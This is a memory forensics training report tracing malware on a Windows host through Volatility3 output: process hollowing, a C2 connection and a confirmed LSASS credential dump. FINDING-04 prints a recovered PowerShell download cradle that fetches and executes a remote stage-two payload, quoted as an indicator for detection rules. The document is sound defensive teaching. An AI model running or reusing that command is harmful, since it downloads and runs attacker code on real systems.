# Memory Forensics Report
## Day 12 — Volatility3 Analysis: DESKTOP-FIN-047 Physical Memory Image

---

| Field | Details |
|-------|---------|
| **Analyst** | Blaakpearl |
| **Report Date** | 2025-01-19 |
| **Report Type** | Digital Forensics — Memory Analysis |
| **Classification** | Portfolio / Training Exercise |
| **Case ID** | NVC-IR-2025-004 |
| **Track** | Digital Forensics |
| **Evidence** | Physical memory image, DESKTOP-FIN-047, 16GB |
| **Capture Time** | 2025-01-16 03:35:04 UTC |
| **ATT&CK Phase** | Defense Evasion / Credential Access / C2 |

---

## Executive Summary

Volatility3 analysis of the full physical memory image captured from
DESKTOP-FIN-047 at the moment of network isolation provides definitive,
live-system corroboration of every major finding from the Day 08 sandbox-based
malware analysis — and upgrades one critical assessment from "attempted" to
"confirmed successful."

Process tree reconstruction confirmed the exact process hollowing signature
predicted in Day 08: PID 5244 (`svchost.exe`) was spawned directly by PID
4412 (`updater.exe`) rather than the legitimate parent `services.exe` — an
anomaly that is definitive forensic proof of process injection on the actual
compromised system, not merely in a sandbox simulation. The `malfind`
plugin recovered an injected PE-format code region from this process with
`PAGE_EXECUTE_READWRITE` memory protection and no corresponding file on
disk, and this same process (PID 5244) was independently confirmed to hold
an `ESTABLISHED` network connection to `185.220.101.33:443` — the exact C2
server identified in Day 04's network traffic analysis. This closes the
evidentiary loop between three previously separate findings (injection,
malware sample, and network C2) into a single, unambiguous process.

Most significantly, handle table analysis confirmed that the injected
process held `PROCESS_VM_READ` access rights to LSASS at the time of
capture, and file system scan recovered metadata for the deleted
`~tmp4891.dll` dump file — proving the LSASS credential dump referenced in
Day 08's sandbox analysis **actually succeeded** on the production system,
not merely in the isolated sandbox environment. **This finding elevates the
credential compromise assessment from probable to confirmed and has direct
implications for the scope of Active Directory credential rotation
already underway following the Day 10 investigation.**

---

## Methodology

```
Phase 1 — Image Verification (20 min)
  Confirmed SHA-256 hash integrity, verified OS profile detection
  SystemTime in image matched known isolation timestamp exactly

Phase 2 — Process Tree Reconstruction (45 min)
  Tools: windows.pslist, windows.psscan, windows.pstree
  Output: Complete process tree, no hidden/unlinked processes found

Phase 3 — Injection Confirmation (60 min)
  Tool: windows.malfind against PID 5244
  Output: Injected PE code extracted with definitive injection signature

Phase 4 — Network State Reconstruction (45 min)
  Tool: windows.netscan
  Output: Active C2 connection confirmed, correlated to injected process

Phase 5 — Credential Access Confirmation (45 min)
  Tools: windows.handles, windows.filescan
  Output: LSASS access rights confirmed, deleted dump file recovered

Phase 6 — Artifact Recovery & Timeline Integration (45 min)
  Tools: windows.cmdline, windows.consoles, windows.envars
  Output: Full command recovery, master timeline updated
```

---

## Technical Findings

---

### FINDING-01 — Process Injection Confirmed via Live Memory Evidence

**Severity:** 🔴 Critical
**ATT&CK:** T1055.012 — Process Hollowing

**Description:**
Process tree reconstruction from the memory image provides definitive,
production-system confirmation of the process hollowing technique first
observed in Day 08's sandbox analysis. PID 5244, identified as `svchost.exe`,
shows PID 4412 (`updater.exe`) as its parent process. Legitimate Windows
`svchost.exe` instances are exclusively spawned by `services.exe` or
`wininit.exe` — never by an arbitrary user-mode executable. This parent-child
anomaly, combined with `malfind` results, provides forensic-grade proof
that this specific `svchost.exe` instance on the actual victim system was
created via process hollowing, not merely demonstrated as a capability in
an isolated sandbox.

**Evidence:**
```
Process Tree (Volatility3 pstree):
  896   services.exe
     4412  updater.exe                    [malicious dropper]
        5120  powershell.exe              [stage 2 download cradle]
        5244  svchost.exe                 [ANOMALOUS PARENT: 4412]
                                           [legitimate parent would be 896]

Malfind Results — PID 5244:
  Region:     0x1a2b3c40000 - 0x1a2b3c4f000
  Protection: PAGE_EXECUTE_READWRITE
  Signature:  4D 5A (MZ header) — valid PE structure in memory-only region
  Backing file: NONE — no corresponding file on disk for this memory region

No discrepancy found between pslist and psscan — confirms no DKOM-style
rootkit hiding was used; the malware relied on injection alone, not
process list manipulation.
```

**Recommendation:**
The extracted injected code region (saved in `artifacts/injection/`) should
undergo the same static analysis workflow as Day 08 (FLOSS string extraction,
PE analysis if the dumped region parses as a valid PE) to determine whether
this represents the identical payload or a distinct second-stage component
unpacked at runtime.

---

### FINDING-02 — Network Connection Confirms Injection-to-C2 Link

**Severity:** 🔴 Critical
**ATT&CK:** T1071.004 — DNS C2 / T1055.012 — Process Hollowing

**Description:**
Network state extraction from memory identified an `ESTABLISHED` TCP
connection from DESKTOP-FIN-047 to `185.220.101.33:443` — the exact C2
server IP confirmed through DNS beacon analysis in Day 04. Critically, this
connection is owned by PID 5244, the same process identified as the target
of process injection in Finding-01. This provides direct, independent
corroboration linking the injection technique to the C2 communication
channel, closing an evidentiary gap between two previously separately-confirmed
findings.

**Evidence:**
```
Netscan Results:
  Proto  LocalAddr    LocalPort  ForeignAddr      ForeignPort  State        PID   Owner
  TCPv4  10.10.5.47   52341      185.220.101.33   443          ESTABLISHED  5244  svchost.exe
  UDPv4  10.10.5.47   54892      8.8.8.8          53           -            5244  svchost.exe
  TCPv4  10.10.5.47   52340      185.220.101.33   443          CLOSE_WAIT   5244  svchost.exe

Cross-reference: PID 5244 = confirmed injected process (Finding-01)
Cross-reference: 185.220.101.33 = confirmed C2 IP (Day 04, Day 09, Day 11)
```

**Significance:**
Prior to this analysis, the C2 network activity (Day 04, via Zeek/DNS logs)
and the process injection (Day 08, via sandbox behavioral analysis) were
established through different evidence sources and reasonably inferred to
be related. This memory forensic finding provides direct, first-hand
confirmation from the actual victim system that both observations describe
the exact same running process — eliminating any residual uncertainty about
whether the injection and the C2 traffic were connected.

**Recommendation:**
No further action beyond what is already underway (Day 04/06 remediation
of the C2 infrastructure and persistence mechanisms). This finding
strengthens confidence in the existing remediation scope rather than
expanding it.

---

### FINDING-03 — LSASS Credential Access CONFIRMED SUCCESSFUL (Upgraded from Day 08)

**Severity:** 🔴 Critical
**ATT&CK:** T1003.001 — OS Credential Dumping: LSASS Memory

**Description:**
This is the most operationally significant finding of the memory forensic
analysis. Day 08's sandbox analysis observed a `MiniDumpWriteDump` API call
targeting LSASS but could only establish that the *capability and attempt*
existed within the malware sample — sandbox behavior does not prove the
same action occurred on the actual production system. Memory forensics on
the real DESKTOP-FIN-047 image closes this gap definitively.

Handle table analysis confirmed that PID 5244 (the confirmed injected
process) held an open handle to `lsass.exe` (PID 752) with
`PROCESS_VM_READ | PROCESS_QUERY_INFORMATION` access rights — precisely
the access level required for `MiniDumpWriteDump` to successfully read
and extract LSASS memory contents. File system scan further recovered
file record metadata for `C:\Windows\Temp\~tmp4891.dll` — the exact dump
file path observed in the Day 08 sandbox — despite this file having been
deleted from disk as an anti-forensic measure. Memory retains MFT cache
and file record artifacts even after deletion, allowing recovery of
evidence the attacker believed was destroyed.

**Evidence:**
```
LSASS Handle Analysis:
  Target process:     lsass.exe (PID 752)
  Accessing process:  svchost.exe [injected] (PID 5244)
  Access rights:      PROCESS_VM_READ | PROCESS_QUERY_INFORMATION
  Assessment:         SUFFICIENT for successful MiniDumpWriteDump execution

Deleted File Recovery:
  Path:    C:\Windows\Temp\~tmp4891.dll
  Status:  Deleted from disk (confirmed absent during Day 01 forensic
           imaging of the disk)
  Recovery: File record metadata recovered from memory MFT cache
  Significance: Proves the file WAS created (dump succeeded) even though
                the attacker's anti-forensic deletion removed it from disk

CONFIDENCE UPGRADE:
  Day 08 assessment:  "LSASS access ATTEMPTED" (sandbox API observation only)
  Day 12 assessment:  "LSASS access CONFIRMED SUCCESSFUL" (live memory
                       forensic evidence: sufficient access rights held +
                       deleted dump file artifact recovered)
```

**Recommendation:**
This finding does not change the remediation actions already recommended
in Day 08 and Day 10 (credential rotation for all accounts authenticated
to DESKTOP-FIN-047 during the compromise window, KRBTGT reset consideration
pending svc_backup timing confirmation) — but it removes any remaining
ambiguity about whether that remediation was necessary. It was. The dump
succeeded.

---

### FINDING-04 — Full Command Recovery Confirms Exact Attack Syntax

**Severity:** 🟡 Medium (confirmatory — no new remediation required)
**ATT&CK:** T1059.001 — PowerShell

**Description:**
Command line recovery from process memory extracted the complete, exact
PowerShell command executed by the dropper — matching the Day 08 sandbox
observation precisely. This confirms the sandbox behavioral analysis
accurately represented the real-world attack execution and provides an
exact IOC (the full command string) suitable for detection rule tuning.

**Evidence:**
```
Recovered and Decoded Command (PID 5120):
  powershell.exe -WindowStyle Hidden -EncodedCommand <base64>

  Decoded:
  IEX(New-Object Net.WebClient).DownloadString('https://185.220.101.33/stage2')

Exact match to Day 08 sandbox-observed command — confirms sandbox behavioral
analysis was representative of actual production execution, validating the
Day 08 findings as reliable rather than sandbox-environment artifacts.
```

**Recommendation:**
Update the Day 06 detection gap analysis: this exact command string can now
be added as a high-confidence Sigma rule condition (PowerShell command-line
containing this specific download pattern), improving detection precision
beyond the generic "EncodedCommand" pattern currently deployed.

---

## MITRE ATT&CK Technique Matrix

| ID | Technique | Tactic | Finding | Evidence Source |
|----|-----------|--------|---------|-----------------|
| **T1055.012** | Process Hollowing | Defense Evasion | FINDING-01 | Live memory (upgraded from sandbox) |
| **T1071.004** | DNS C2 | Command & Control | FINDING-02 | Live memory + Day 04 correlation |
| **T1003.001** | LSASS Memory | Credential Access | FINDING-03 | Live memory (upgraded from "attempted") |
| **T1059.001** | PowerShell | Execution | FINDING-04 | Live memory (confirms Day 08) |
| **T1057** | Process Discovery | Discovery | Methodology | pslist/psscan/pstree |
| **T1049** | Network Connections Discovery | Discovery | Methodology | netscan |
| **T1027** | Obfuscated Files/Info | Defense Evasion | FINDING-01 | malfind extraction |

---

## Confidence Upgrades from Day 08

| Assessment | Day 08 (Sandbox) | Day 12 (Live Memory) |
|-----------|-------------------|----------------------|
| Process hollowing | Observed in sandbox behavior | **Confirmed on production system** |
| C2 communication from injected process | Inferred via Day 04 correlation | **Directly confirmed same PID** |
| LSASS credential dump | "Attempted" (API call observed) | **"Successful" (access + artifact confirmed)** |
| Attack command syntax | Sandbox-observed | **Confirmed identical on real system** |

---

## Risk Assessment — DREAD Scoring

| Finding | Damage | Reproducibility | Exploitability | Affected Users | Discoverability | **/50** | **Rating** |
|---------|:------:|:---------------:|:--------------:|:--------------:|:---------------:|:-------:|:----------:|
| FINDING-01 (Injection confirmed) | 8 | 7 | 7 | 5 | 4 | **31** | 🟠 High |
| FINDING-02 (C2 link confirmed) | 7 | 6 | 6 | 5 | 3 | **27** | 🟠 High |
| FINDING-03 (LSASS success) | 10 | 6 | 8 | 10 | 2 | **36** | 🔴 Critical |
| FINDING-04 (Command recovery) | 3 | 4 | 3 | 2 | 6 | **18** | 🟢 Low |

### Overall Assessment: 🔴 CRITICAL (driven by confirmed LSASS success)

---

## Consolidated Master Timeline Contribution

```
Memory forensics did not identify NEW attack phases — it CONFIRMED and
UPGRADED confidence on existing findings from Days 04, 06, and 08:

  09:12:00 UTC  PowerShell encoded command execution — CONFIRMED exact syntax
  09:12:44 UTC  Process hollowing into svchost.exe — CONFIRMED via live pstree
  09:12:45 UTC  LSASS credential dump — CONFIRMED SUCCESSFUL (was "attempted")
  Active at
  capture:      C2 connection to 185.220.101.33 — CONFIRMED same injected PID
```

---

## Recommendations

| Priority | Action | Owner | Status |
|----------|--------|-------|--------|
| **P0** | No new credential rotation required — Day 08/10 scope already covers this | IT Security | Already in progress |
| **P1** | Add exact recovered command string to Sigma detection rule for higher precision | Detection Eng | 24 hours |
| **P1** | Perform static analysis on extracted injected code region (compare to Day 08 sample) | Forensics | 48 hours |
| **P2** | Update Day 08 report status: LSASS access "attempted" → "confirmed successful" | Documentation | This report |
| **P2** | Archive memory image and all Volatility3 outputs per evidence retention policy | IR Team | 1 week |
| **P3** | Consider memory-only Sigma/EDR rules for MFT-cache deleted-file recovery pattern | Detection Eng | 30 days |

---

## Analyst Notes — On the Value of Memory Forensics

This investigation illustrates precisely why memory forensics is
considered the gold standard of digital forensic evidence for active
intrusions. Every finding in this report was already suspected — Day 08's
sandbox analysis predicted process injection, C2 communication, and LSASS
access with high confidence. What memory forensics provided was not new
information but **evidentiary certainty**: the difference between "this
malware sample is capable of X" and "this malware sample definitely did X
on this specific system, and here is the process, the memory address, and
the access rights to prove it."

That distinction matters enormously in an incident response context. Sandbox
analysis characterizes a threat. Memory forensics proves what actually
happened. When this incident's findings are eventually reported to
regulators, insurers, or in potential legal proceedings, the difference
between "sandbox analysis suggests credential theft may have occurred" and
"memory forensic analysis confirms the malware held sufficient LSASS access
rights and a deleted dump file artifact was recovered proving successful
extraction" is the difference between a hedge and a fact.

The recovered deleted file (`~tmp4891.dll`) deserves particular attention
as a teaching point: the attacker attempted anti-forensic cleanup by
deleting the dump file from disk. That cleanup succeeded against disk
forensics — the file was genuinely gone by the time Day 01's disk imaging
occurred. It failed completely against memory forensics, because file
system metadata persists in memory's MFT cache long after deletion. This
is exactly why memory capture before shutdown, as a standard IR procedure,
proved decisive in this investigation.

---

## References

- [Volatility3 Documentation](https://volatility3.readthedocs.io/)
- [MITRE ATT&CK T1055.012 — Process Hollowing](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK T1003.001 — LSASS Memory](https://attack.mitre.org/techniques/T1003/001/)
- [SANS FOR508 — Advanced Incident Response and Threat Hunting](https://www.sans.org/cyber-security-courses/advanced-incident-response-threat-hunting-training/)
- [Volatility Foundation — Memory Forensics Training Images](https://volatilityfoundation.org/)

---

*Previous: [Day 11 ←](../day-11/REPORT.md) | Next: [Day 13 →](../day-13/SCENARIO.md)*

---
*Report generated as part of the [Blaakpearl 30-Day Security Portfolio](../../README.md)*
